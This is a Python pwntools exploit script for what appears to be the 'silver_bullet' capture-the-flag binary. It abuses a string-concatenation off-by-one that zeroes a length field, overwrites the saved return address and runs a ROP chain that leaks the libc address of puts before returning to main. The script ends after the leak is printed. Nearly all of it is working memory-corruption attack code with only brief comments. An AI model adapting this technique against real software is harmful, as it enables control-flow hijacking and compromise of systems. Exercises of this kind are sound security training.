#!/usr/bin/env python3
from pwn import *

PAD = lambda x: b"a" * x
elf = ELF("./given/silver_bullet")

def conn():
    if args.REMOTE:
        p = remote("127.0.0.1", 1337)
    else:
        p = process([elf.path])
        if args.D:
            gdb.attach(p, "b *power_up + 135")
    return p

def create_buffer(buf, p):
    p.recvuntil(b"Your choice :")
    p.sendline(b"1")
    p.recvuntil(b"Give me your description of bullet :")
    p.send(buf)
    power_desc = p.recvline()
    power = int(power_desc.split(b" ")[-1])
    print(power)

def concat_buffer(buf, p):
    p.recvuntil(b"Your choice :")
    p.sendline(b"2")
    p.recvuntil(b"Give me your another description of bullet :")
    p.send(buf)
    print(p.recvline())

def beat_wolf(p):
    p.recvuntil(b"Your choice :")
    p.sendline(b"3")


def prepare_size_overwrite(p):
    create_buffer(PAD(0x2f), p)

    concat_buffer(PAD(0x1), p)
    # strncpy will place an "\x00" at the end of the buffer
    # and therefore bullets->size = 0, it will be added with
    # concatenated buffer 0x1.
    # In conclusion, we can still write 0x2f bytes starting from -0x3(%ebp)

def overwrite_and_return(ropchain, p):
    size_bytes = b"\xff\xff\xff"
    saved_ebp = PAD(4)

    payload = size_bytes + saved_ebp + ropchain
    concat_buffer(payload, p)

    # beat the wolf, so that we can return from main()
    # otherwise, exit()
    beat_wolf(p)

def exploit():
    p = conn()
    plt_puts = 0x80484a8
    got_puts = 0x804afdc
    func_main = 0x8048954
    rop_1 = 0x8048a7b

    prepare_size_overwrite(p)
    ropchain = p32(plt_puts) + p32(rop_1) + p32(got_puts) + p32(func_main)
    overwrite_and_return(ropchain, p)
    p.recvuntil(b"Oh ! You win !!\n")
    leak = p.recvn(4)
    print(hex(u32(leak)))


if __name__ == "__main__":
    exploit()
